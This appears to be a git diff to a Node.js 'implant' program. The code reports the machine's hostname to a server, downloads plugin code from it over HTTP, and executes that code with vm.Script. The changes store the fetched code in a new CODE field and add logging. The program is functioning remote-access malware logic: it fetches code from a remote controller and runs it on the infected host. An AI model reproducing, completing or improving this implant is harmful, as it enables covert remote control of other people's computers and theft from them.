@@ -12,6 +12,7 @@ const CP = "client_password";
 var implant = {};
 implant[PL] = [];
 implant[IN] = os.hostname();
+implant['CODE'] = [];
 
 var run_plugins = function() {
     //TODO Create the correct sandbox to support all plugins that could be written
@@ -20,7 +21,8 @@ var run_plugins = function() {
         console
     };
     implant[PL].forEach(element => {
-        const script = new vm.Script(implant[PL][element]);
+        console.log('RUNNING',element,'WITH CODE',implant['CODE'][element]);
+        const script = new vm.Script(implant['CODE'][element]);
         const context = new vm.createContext(sandbox);
         script.runInNewContext(context);
         // eval(implant[PL][element]);
@@ -37,12 +39,12 @@ var download_plugins = function() {
             'Content-Type': 'application/json',
         },
     };
-
+    console.log(implant);
     implant[PL].forEach(element => {
-        const postData = JSON.stringify({
-            IN: implant[IN],
-            PN: element
-        });
+        var data = {};
+        data[IN] = implant[IN];
+        data[PN] = element;
+        const postData = JSON.stringify(data);
         options['headers']['Content-Length'] = Buffer.byteLength(postData);
 
         const req = http.request(options, (res) => {
@@ -56,7 +58,7 @@ var download_plugins = function() {
             });
             res.on('end', () => {
                 console.log('No more data in response.');
-                implant[element] = chucked_data;
+                implant['CODE'][element] = chucked_data;
             });
         });
     
